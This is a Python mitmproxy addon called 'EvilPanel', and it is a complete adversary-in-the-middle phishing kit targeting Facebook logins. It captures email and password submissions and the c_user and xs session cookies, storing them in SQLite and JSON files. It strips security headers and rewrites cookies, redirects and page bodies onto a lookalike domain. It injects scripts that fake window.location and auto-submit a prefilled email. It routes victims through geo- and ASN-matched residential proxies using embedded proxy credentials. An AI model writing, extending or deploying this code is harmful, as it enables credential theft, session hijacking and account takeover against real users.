"""
EvilPanel mitmproxy Addon v6.2
- Smart geo-proxy with ASN priority
- Captures credentials and session tokens
- Rewrites cookies, locations, and body hosts (plain + URL-encoded) to tunnel domain
- Injects location spoofing and optional email prefill for 2-step flows
"""

import os
import json
import sqlite3
import subprocess
import re
from datetime import datetime
from mitmproxy import http, ctx
from urllib.parse import urlparse, parse_qs, urlencode, unquote
from facebook_session_addon import FacebookSessionAddon

# ========== CONFIG ==========
DOMAIN = os.environ.get("EVILPANEL_DOMAIN", "NEWDOMAIN_PLACEHOLDER")
DATA_DIR = os.environ.get("EVILPANEL_DATA", "/opt/evilpanel/data")
DB_PATH = os.path.join(DATA_DIR, "evilpanel.db")

# Debug/Logging controls
DEBUG_LOGIN_FLOWS = True
DEBUG_LOG_HEADERS = os.getenv("EVILPANEL_LOG_HEADERS", "0") == "1"
LOG_BODY_PREVIEW_LEN = 12000

# Login detection patterns
LOGIN_PATTERNS = [
    r"facebook\.com/(login\.php|login/device-based/validate-password)",
    r"m\.facebook\.com/(login\.php|login/device-based/validate-password)",
    r"m\.facebook\.com/async/wbloks/fetch",
    r"facebook\.com/async/wbloks/fetch",
    r"facebook\.com/ajax/.*(login|auth|validate)",
    r"m\.facebook\.com/ajax/.*(login|auth|validate)",
    r"facebook\.com/api/graphql",
    r"facebook\.com/a/bz",
    r"m\.facebook\.com/a/bz",
    r"bloks\.caa\.login\.async\.send_login_request",
]

LOGIN_KEYWORDS = ["encpass", "pass=", "password=", '"pass"', '"password"']

DI_USER = "768b27aac68d92f840d9"
DI_PASS = "b7564921f7b4962f"
DI_HOST = "gw.dataimpulse.com"
DI_PORT = 10000

_geo_cache = {}

# ========== GEO FUNCTIONS ==========
def get_geo(ip):
    if ip in _geo_cache:
        return _geo_cache[ip]
    if ip.startswith(("127.", "10.", "192.168.")):
        return None
    try:
        result = subprocess.run(
            [
                "curl",
                "-s",
                "--connect-timeout",
                "2",
                f"http://ip-api.com/json/{ip}?fields=status,countryCode,regionName,city,zip,isp,as,mobile",
            ],
            capture_output=True,
            text=True,
            timeout=4,
        )
        data = json.loads(result.stdout)
        if data.get("status") != "success":
            return None

        as_full = data.get("as", "")
        asn = as_full.split()[0][2:] if as_full.startswith("AS") else ""

        def clean(v):
            return "".join(c for c in str(v).lower() if c.isalnum()) if v else ""

        geo = {
            "country": data.get("countryCode", "").lower(),
            "state": clean(data.get("regionName", "")),
            "city": clean(data.get("city", "")),
            "zip": clean(data.get("zip", "")),
            "asn": asn,
            "isp": data.get("isp", ""),
            "mobile": data.get("mobile", False),
        }
        _geo_cache[ip] = geo
        return geo
    except Exception:
        return None


def build_proxy_levels(geo):
    """Build proxy list from most specific to least. ASN always included."""
    if not geo:
        return [(f"socks5://{DI_USER}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "BASE")]

    c = geo.get("country", "")
    a = geo.get("asn", "")
    s = geo.get("state", "")
    ci = geo.get("city", "")
    z = geo.get("zip", "")

    levels = []

    if a and s and ci and z:
        params = f"cr.{c};asn.{a};state.{s};city.{ci};zip.{z}"
        levels.append(
            (f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "FULL")
        )

    if a and s and ci:
        params = f"cr.{c};asn.{a};state.{s};city.{ci}"
        levels.append(
            (f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "NO_ZIP")
        )

    if a and s:
        params = f"cr.{c};asn.{a};state.{s}"
        levels.append(
            (f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "NO_CITY")
        )

    if a:
        params = f"cr.{c};asn.{a}"
        levels.append(
            (f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "ASN_ONLY")
        )

    if c:
        params = f"cr.{c}"
        levels.append(
            (f"socks5://{DI_USER}__{params}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "COUNTRY_ONLY")
        )

    levels.append((f"socks5://{DI_USER}:{DI_PASS}@{DI_HOST}:{DI_PORT}", "BASE"))
    return levels


def _log(msg):
    if DEBUG_LOGIN_FLOWS:
        ctx.log.info(msg)


def _truncate(text, limit=LOG_BODY_PREVIEW_LEN):
    if text is None:
        return ""
    return text[:limit]


def is_login(flow):
    """Heuristic to detect FB login attempts."""
    if flow.request.method != "POST":
        return False
    url = flow.request.pretty_url.lower()
    path = flow.request.path.lower()
    body = flow.request.get_text() or ""
    body_lower = body.lower()
    # Match on full URL (facebook domains) OR path patterns when hitting our tunnel domain
    if any(re.search(p, url) for p in LOGIN_PATTERNS):
        return True
    if any(
        s in path
        for s in [
            "/login.php",
            "/login/device-based/validate-password",
            "/async/wbloks/fetch",
            "/a/bz",
            "/ajax/",
            "/api/graphql",
            "/login/",
            "/identify",
        ]
    ):
        return True
    if "bloks.caa.login.async.send_login_request" in body_lower:
        return True
    if any(k in body for k in LOGIN_KEYWORDS):
        return True
    return False


def extract_creds(flow):
    """Parse credentials from multiple payload styles."""
    email = ""
    password = ""
    body = flow.request.get_text() or ""

    # 1) urlencoded form
    try:
        form = dict(flow.request.urlencoded_form)
        email = form.get("email") or form.get("username") or form.get("login") or ""
        password = (
            form.get("pass") or form.get("password") or form.get("encpass") or ""
        )
    except Exception:
        pass


    # 2b) FB CAA double-encoded params
    if (not email or not password) and body:
        try:
            params_raw = None
            try:
                form = dict(flow.request.urlencoded_form)
                params_raw = form.get("params")
            except Exception:
                params_raw = None
            if not params_raw:
                m = re.search(r"params=([^&]+)", body)
                if m:
                    params_raw = m.group(1)
            if params_raw:
                decoded = unquote(params_raw)
                outer = json.loads(decoded)
                inner = outer.get("params", outer) if isinstance(outer, dict) else None
                if isinstance(inner, str):
                    inner = json.loads(inner)
                if isinstance(inner, dict):
                    server_params = inner.get("server_params", inner) or {}
                    client_params = inner.get("client_input_params", {}) if isinstance(inner, dict) else {}
                    email = email or server_params.get("email") or server_params.get("identifier") or server_params.get("login") or client_params.get("contact_point") or ""
                    password = password or server_params.get("password") or server_params.get("pass") or server_params.get("encpass") or client_params.get("password") or ""
        except Exception as ex:
            _log(f"[CRED] params parse err: {ex} body={_truncate(body)}")

    # 3) Regex fallback (safe character classes)
    try:
        if not email and body:
            em = re.search(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", body)
            if em:
                email = em.group(0)
        if not password and body:
            pm = re.search(r"(encpass|pass|password)[\"\s:=]+([^\"&,\\s\\}]+)", body, re.I)
            if pm:
                password = pm.group(2)
    except Exception as rex:
        _log(f"[CRED] regex parse error: {rex} body={_truncate(body)}")

    return email, password


def classify_response(flow, resp_text):
    lt = (resp_text or "").lower()
    loc = flow.response.headers.get("Location", "").lower()

    if ("checkpoint" in lt) or ("checkpoint" in loc) or any(
        k in lt for k in ["twofactor", "verify", "suspicious", "approvals"]
    ):
        return "RISK_FLOW"
    if "incorrect" in lt or "login_error" in lt or "wrong password" in lt:
        return "BAD_PASSWORD"
    return "UNKNOWN"


# ========== MAIN ADDON ==========
class EvilPanelAddon:
    def __init__(self):
        self.domain = DOMAIN
        self._init_db()
        ctx.log.info(f"[EvilPanel v6.1] Smart Geo-Proxy with ASN Priority")

    def _init_db(self):
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.execute(
                """CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    fingerprint_id TEXT,
                    request_path TEXT,
                    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )"""
            )
            conn.execute(
                """CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    c_user TEXT,
                    xs TEXT,
                    fr TEXT,
                    datr TEXT,
                    sb TEXT,
                    wd TEXT,
                    presence TEXT,
                    ip_address TEXT,
                    credential_id INTEGER,
                    all_cookies TEXT,
                    status TEXT DEFAULT 'active',
                    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (credential_id) REFERENCES credentials(id)
                )"""
            )
            conn.commit()
            conn.close()
        except Exception as e:
            ctx.log.error(f"[DB] {e}")

    def request(self, flow: http.HTTPFlow):
        target_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"

        geo = None
        proxy_levels = []
        if not target_ip.startswith("127."):
            geo = get_geo(target_ip)
            if geo:
                proxy_levels = build_proxy_levels(geo)
                ctx.log.info(
                    f"[GEO] {target_ip} {geo['country'].upper()}/{geo['state']}/{geo['city']}/{geo['zip']} ASN:{geo['asn']}"
                )

        flow.metadata["target_ip"] = target_ip
        flow.metadata["geo"] = geo
        flow.metadata["proxy_levels"] = proxy_levels

        # Strip FB redirect helper (_rdr) to avoid loops and keep clean identify URL
        try:
            parsed_req = urlparse(flow.request.url)
            if parsed_req.path.startswith("/login/identify"):
                qs = parse_qs(parsed_req.query)
                if "_rdr" in qs:
                    qs.pop("_rdr", None)
                    new_query = urlencode(qs, doseq=True)
                    flow.request.url = parsed_req._replace(query=new_query).geturl()
        except Exception:
            pass

        # Capture email from query param for pre-fill use in response
        if "email=" in flow.request.url:
            parsed = urlparse(flow.request.url)
            params = parse_qs(parsed.query)
            if "email" in params and params["email"]:
                flow.metadata["prefill_email"] = params["email"][0]

        # Detect login flows for instrumentation and capture
        if is_login(flow):
            flow.metadata["is_login"] = True
            body = flow.request.get_text() or ""
            _log(
                f"[DEBUG-REQ] {flow.request.method} {flow.request.url} "
                f"CT={flow.request.headers.get('Content-Type','')} len={len(body)} "
                f"body={_truncate(body)}"
            )
            if DEBUG_LOG_HEADERS:
                ck = flow.request.headers.get('Cookie', '')
                origin = flow.request.headers.get('Origin', '')
                referer = flow.request.headers.get('Referer', '')
                _log(f"[HDR-REQ] cookie={_truncate(ck,200)} origin={_truncate(origin,200)} referer={_truncate(referer,200)}")
            self._capture_creds(flow, body_hint=body)

        host = flow.request.host
        if host.endswith(self.domain):
            flow.request.host = "m.facebook.com"
            flow.request.headers["Host"] = "m.facebook.com"
            flow.request.headers["Origin"] = "https://m.facebook.com"
            flow.request.headers["Referer"] = "https://m.facebook.com/"

        ctx.log.info(f"[FLOW][REQ] {flow.request.method} {flow.request.pretty_url}")

    def _capture_creds(self, flow, body_hint=""):
        try:
            email, password = extract_creds(flow)
            _log(f"[CRED-PARSE] email={email} pw_len={len(password) if password else 0}")

            if email and password:
                ip = flow.metadata.get("target_ip", "")
                ua = flow.request.headers.get("User-Agent", "")
                req_path = flow.request.path

                ctx.log.info(f"[CRED] ✅ {email} from {ip}")

                record = {
                    "timestamp": datetime.utcnow().isoformat(),
                    "email": email,
                    "password": password,
                    "ip": ip,
                    "ua": ua,
                    "path": req_path,
                }
                with open(os.path.join(DATA_DIR, "credentials.json"), "a") as f:
                    f.write(json.dumps(record) + "\n")

                conn = sqlite3.connect(DB_PATH)
                conn.execute(
                    "INSERT INTO credentials (email,password,ip_address,user_agent,fingerprint_id,request_path) VALUES (?,?,?,?,?,?)",
                    (email, password, ip, ua, "", req_path),
                )
                conn.commit()
                conn.close()
        except Exception as e:
            ctx.log.error(f"[CRED] Error: {e}")

    def response(self, flow: http.HTTPFlow):
        # Strip telemetry / security headers
        strip_headers = [
            "Content-Security-Policy",
            "X-Frame-Options",
            "Strict-Transport-Security",
            "report-to",
            "reporting-endpoints",
            "cross-origin-opener-policy",
            "cross-origin-embedder-policy-report-only",
        ]
        for h in strip_headers:
            if h in flow.response.headers:
                del flow.response.headers[h]

        # Login response debug/classification before rewrites
        if flow.metadata.get("is_login"):
            try:
                resp_text = flow.response.get_text()
            except Exception:
                resp_text = ""
            preview = _truncate(resp_text)
            cookies_hdr = flow.response.headers.get("Set-Cookie", "")
            tag = classify_response(flow, resp_text)
            _log(
                f"[DEBUG-RESP] {flow.request.path} status={flow.response.status_code} tag={tag} "
                f"cookies:c_user={'c_user' in cookies_hdr} xs={'xs' in cookies_hdr} body={preview}"
            )
            if DEBUG_LOG_HEADERS:
                try:
                    set_cookies = flow.response.headers.get_all('Set-Cookie')
                except Exception:
                    set_cookies = []
                set_joined = '; '.join(set_cookies) if set_cookies else ''
                _log(f"[HDR-RESP] set-cookie={_truncate(set_joined,200)}")

        self._capture_tokens(flow)
        self._rewrite_cookies(flow)
        self._rewrite_location(flow)
        self._rewrite_body_hosts(flow)
        self._inject_location_spoof(flow)

        ctx.log.info(f"[FLOW][RESP] {flow.request.method} {flow.request.pretty_url} -> {flow.response.status_code}")

    def _capture_tokens(self, flow):
        critical = ["c_user", "xs"]
        all_tokens = ["c_user", "xs", "fr", "datr", "sb", "wd", "presence"]
        captured = {}

        for name, vals in flow.response.cookies.items():
            val = vals[0] if vals else ""
            if name in all_tokens and val:
                captured[name] = val

        if all(k in captured for k in critical):
            ip = flow.metadata.get("target_ip", "")

            ctx.log.info(f"[SESSION] ✅ c_user={captured['c_user']} xs={captured['xs'][:18]}...")

            record = {
                "timestamp": datetime.utcnow().isoformat(),
                "tokens": captured,
                "ip": ip,
            }
            with open(os.path.join(DATA_DIR, "sessions.json"), "a") as f:
                f.write(json.dumps(record) + "\n")

            try:
                conn = sqlite3.connect(DB_PATH)
                conn.execute(
                    """INSERT INTO sessions (c_user,xs,fr,datr,sb,wd,presence,ip_address,all_cookies) 
                       VALUES (?,?,?,?,?,?,?,?,?)""",
                    (
                        captured.get("c_user", ""),
                        captured.get("xs", ""),
                        captured.get("fr", ""),
                        captured.get("datr", ""),
                        captured.get("sb", ""),
                        captured.get("wd", ""),
                        captured.get("presence", ""),
                        ip,
                        json.dumps(captured),
                    ),
                )
                conn.commit()
                conn.close()
            except Exception as e:
                ctx.log.error(f"[SESSION] DB Error: {e}")

    def _rewrite_cookies(self, flow):
        cookies = flow.response.headers.get_all("Set-Cookie")
        if not cookies:
            return
        del flow.response.headers["Set-Cookie"]
        for c in cookies:
            new_c = c
            for dom in [".facebook.com", ".m.facebook.com", "facebook.com", "m.facebook.com"]:
                new_c = new_c.replace(f"domain={dom}", f"domain=.{self.domain}")
                new_c = new_c.replace(f"domain=.{dom.lstrip('.')}", f"domain=.{self.domain}")
            flow.response.headers.add("Set-Cookie", new_c)

    def _rewrite_location(self, flow):
        loc = flow.response.headers.get("Location")
        if not loc:
            return
        for dom in [
            "https://m.facebook.com",
            "https://facebook.com",
            "https://www.facebook.com",
            "http://m.facebook.com",
            "http://facebook.com",
            "http://www.facebook.com",
        ]:
            if loc.startswith(dom):
                flow.response.headers["Location"] = loc.replace(dom, f"https://{self.domain}", 1)
                return

    def _rewrite_body_hosts(self, flow):
        ct = flow.response.headers.get("Content-Type", "")
        if not any(t in ct for t in ["text/html", "application/xhtml", "javascript"]):
            return
        body = flow.response.get_text()
        if not body:
            return
        plain_domains = [
            "https://m.facebook.com",
            "https://facebook.com",
            "https://www.facebook.com",
            "http://m.facebook.com",
            "http://facebook.com",
            "http://www.facebook.com",
            "//m.facebook.com",
            "//www.facebook.com",
        ]
        for dom in plain_domains:
            body = body.replace(dom, f"https://{self.domain}")

        # URL-encoded patterns
        url_encoded_patterns = [
            ("https%3A%2F%2Fm.facebook.com", f"https%3A%2F%2F{self.domain}"),
            ("https%3A%2F%2Fwww.facebook.com", f"https%3A%2F%2F{self.domain}"),
            ("https%3A%2F%2Ffacebook.com", f"https%3A%2F%2F{self.domain}"),
            ("%2F%2Fm.facebook.com", f"%2F%2F{self.domain}"),
            ("%2F%2Fwww.facebook.com", f"%2F%2F{self.domain}"),
            ("m.facebook.com%2F", f"{self.domain}%2F"),
            ("www.facebook.com%2F", f"{self.domain}%2F"),
        ]
        for old, new in url_encoded_patterns:
            body = body.replace(old, new)

        flow.response.set_text(body)

    def _inject_location_spoof(self, flow):
        ct = flow.response.headers.get("Content-Type", "")
        if "text/html" not in ct:
            return
        body = flow.response.get_text()
        if not body:
            return

        # Location spoof (override getter to report m.facebook.com)
        spoof_script = """<script>(function(){
try{
  const realLoc = window.location;
  const fake = new Proxy(realLoc,{
    get(target, prop){
      if(prop==='hostname') return 'm.facebook.com';
      if(prop==='host') return 'm.facebook.com';
      if(prop==='origin') return 'https://m.facebook.com';
      if(prop==='href') return target.href.replace(target.hostname,'m.facebook.com');
      if(prop==='toString') return function(){ return target.href.replace(target.hostname,'m.facebook.com'); };
      return (typeof target[prop]==='function') ? target[prop].bind(target) : target[prop];
    },
    set(){ return true; }
  });
  Object.defineProperty(window,'location',{get(){return fake;},set(){return true;}});
}catch(e){}
})();</script>"""

        # Email prefill + AUTO-SUBMIT for /login/identify/
        prefill_email = flow.metadata.get("prefill_email", "")
        prefill_script = ""
        if prefill_email:
            esc_email = prefill_email.replace("\\", "\\\\").replace('"', '\\"').replace("'", "\\'")
            prefill_script = f"""<script>
document.addEventListener('DOMContentLoaded', function() {{
  var emailField = document.querySelector('input[name="email"]') ||
                   document.querySelector('input[type="email"]') ||
                   document.querySelector('input[type="text"]') ||
                   document.getElementById('m_login_email');
  if (emailField) {{
    emailField.value = "{esc_email}";
    emailField.dispatchEvent(new Event('input', {{bubbles: true}}));
    emailField.dispatchEvent(new Event('change', {{bubbles: true}}));
    
    // AUTO-SUBMIT for /login/identify/ page
    if (window.location.pathname.includes('/login/identify')) {{
      setTimeout(function() {{
        var form = emailField.closest('form');
        var submitBtn = document.querySelector('button[type="submit"]') ||
                        document.querySelector('button[name="login"]') ||
                        document.querySelector('input[type="submit"]');
        if (submitBtn) {{
          submitBtn.click();
        }} else if (form) {{
          form.submit();
        }}
      }}, 500);
    }}
  }}
}});
</script>"""

        injection = spoof_script + prefill_script
        if "<head>" in body:
            body = body.replace("<head>", "<head>" + injection, 1)
        elif "<HEAD>" in body:
            body = body.replace("<HEAD>", "<HEAD>" + injection, 1)
        else:
            body = injection + body

        flow.response.set_text(body)


addons = [EvilPanelAddon(), FacebookSessionAddon()]
